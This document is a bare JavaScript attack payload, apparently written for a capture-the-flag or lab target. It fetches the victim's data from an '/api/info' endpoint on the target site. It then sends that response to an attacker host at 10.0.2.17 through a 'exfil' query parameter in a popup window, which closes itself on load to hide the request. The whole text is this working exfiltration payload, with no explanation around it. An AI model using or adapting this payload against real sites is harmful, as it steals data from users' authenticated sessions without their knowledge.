var xhr = new XMLHttpRequest();
xhr.onreadystatechange = () =>{
        if(xhr.readyState == XMLHttpRequest.DONE){
                openwindow = window.open("http://10.0.2.17/?exfil=" + xhr.response);
                if(openwindow){
                        openwindow.onload = () => {
                                openwindow.close();
                        }
                }
        }
};
xhr.open('GET',"https://guitjapeo.thl/api/info",false);
xhr.send();
